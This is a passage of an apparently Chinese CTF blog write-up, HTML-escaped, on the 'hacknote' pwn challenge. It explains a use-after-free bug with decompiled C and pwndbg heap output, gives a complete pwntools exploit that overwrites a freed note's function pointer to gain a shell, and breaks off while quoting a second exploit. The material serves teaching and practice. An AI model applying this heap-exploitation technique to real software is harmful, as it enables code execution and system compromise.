class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;(notelist[v1]);  &lt;span class=&#34;comment&#34;&gt;// 释放后但没有清零!! 漏洞点&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Success&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; __readgsdword(&lt;span class=&#34;number&#34;&gt;0x14&lt;/span&gt;u) ^ v3;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;print_note&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v1; &lt;span class=&#34;comment&#34;&gt;// [esp+4h] [ebp-14h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; buf; &lt;span class=&#34;comment&#34;&gt;// [esp+8h] [ebp-10h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v3; &lt;span class=&#34;comment&#34;&gt;// [esp+Ch] [ebp-Ch]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v3 = __readgsdword(&lt;span class=&#34;number&#34;&gt;0x14&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Index :&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &amp;amp;buf, &lt;span class=&#34;number&#34;&gt;4u&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v1 = atoi(&amp;amp;buf);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v1 &amp;lt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; || v1 &amp;gt;= count )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Out of bound!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _exit(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( notelist[v1] )   &lt;span class=&#34;comment&#34;&gt;// 释放后仍然可以调用! 漏洞点!!&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    (*(&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; (__cdecl **)(&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *))notelist[v1])(notelist[v1]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; __readgsdword(&lt;span class=&#34;number&#34;&gt;0x14&lt;/span&gt;u) ^ v3;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;思路&#34;&gt;&lt;a href=&#34;#思路&#34; class=&#34;headerlink&#34; title=&#34;思路&#34;&gt;&lt;/a&gt;思路&lt;/h3&gt;&lt;p&gt;​		free后没有清空notelist的内容,也就是说,还可以继续调用print_note函数,也就是可以调用notelist对应的块的print_note_content函数,如果能够将这个函数修改成后门函数或者system函数的话,就可以getshell.&lt;/p&gt;
&lt;p&gt;​		&lt;font color=&#34;red&#34;&gt;问题是如何获取这一块空间进行修改呢?&lt;/font&gt;, 存储函数地址的这一块空间本质上也是普通的一块堆的空间,可以在释放后重新申请到,所以可以进行释放再申请,但是释放了的话,再申请一次,第一个释放的8字节存放函数地址的chunk还是会被申请为存放函数地址的空间.&lt;/p&gt;
&lt;p&gt;​		不过我们可以最开始连续申请两个notelist,然后再释放,这样的话,第二个notelist存放函数的chunk,就可以被申请作为数据的chunk了&lt;/p&gt;
&lt;p&gt;1.申请note0和note1,大小随意,不是8及以下就行, 如16&lt;/p&gt;
&lt;p&gt;​		不能是8及以下是因为不能和存放函数的chunk进入同一个fastbin的链表,不然会影响,&lt;/p&gt;
&lt;p&gt;​		注意,此时会有4个chunk, 2个是用来存放put和content指针的, 两个是存放数据的&lt;/p&gt;
&lt;p&gt;2.释放note0和note1,这时候有4个bins了,其中0x10大小的就是存放put和content指针的&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; bins&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fastbins&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x804b028&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x804b000&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x18&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x804b038&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x804b010&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x38&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;&lt;p&gt;申请一个大小为8的note2,这个时候就会分别用到0x10的两个fastbin&lt;/p&gt;
&lt;p&gt;&lt;font color=&#34;red&#34;&gt;而第二个0x10的bin,其实就是note1的存放函数地址的指针&lt;/font&gt;,修改为后们函数地址后再通过uaf进行print_note中的函数调用就可以getshell了&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; bins&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fastbins&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x18&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x804b038&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x804b010&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; heap&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Allocated chunk | PREV_INUSE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Addr: &lt;span class=&#34;number&#34;&gt;0x804b000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Size: &lt;span class=&#34;number&#34;&gt;0x11&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Free &lt;span class=&#34;title function_&#34;&gt;chunk&lt;/span&gt; &lt;span class=&#34;params&#34;&gt;(fastbins)&lt;/span&gt; | PREV_INUSE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Addr: 0x804b010&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Size: 0x19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fd: 0x00&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Allocated chunk | PREV_INUSE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Addr: 0x804b028&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Size: 0x11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;此时,我们在申请的这个note2中,填入magic函数的地址,就覆盖了note0的put和content指针,&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;x/&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;wx &lt;span class=&#34;number&#34;&gt;0x804b000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x804b000&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00000011&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x61616161&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0a616161&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;为什么一开始不是数据呢,一开始是存放的chunk的结构等信息&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;再调用note0的put,就成功调用了magic函数!exp&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level= &lt;span class=&#34;string&#34;&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io = process(&lt;span class=&#34;string&#34;&gt;&amp;quot;./hacknote&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;add&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;length,context&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;choice&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;size&amp;quot;&lt;/span&gt;,length)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Content&amp;quot;&lt;/span&gt;,context)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;delete&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;index&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;choice&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;2&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Index&amp;quot;&lt;/span&gt;,index)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;Print&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;index&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;choice&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;3&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Index&amp;quot;&lt;/span&gt;,index)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;string&#34;&gt;&amp;quot;16&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;quot;aaa&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;string&#34;&gt;&amp;quot;16&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;quot;bbb&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;delete(&lt;span class=&#34;string&#34;&gt;&amp;quot;0&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;delete(&lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;string&#34;&gt;&amp;quot;8&amp;quot;&lt;/span&gt;,p32(&lt;span class=&#34;number&#34;&gt;0x08048986&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Print(&lt;span class=&#34;string&#34;&gt;&amp;quot;0&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recv(&lt;span class=&#34;number&#34;&gt;1024&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recv(&lt;span class=&#34;number&#34;&gt;1024&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recv(&lt;span class=&#34;number&#34;&gt;1024&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​	几个细节问题,比如为什么不能用数字什么的,先看看比较官方的exp怎么写的吧&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#!/usr/bin/env python&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# -*- coding: utf-8 -*-&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span 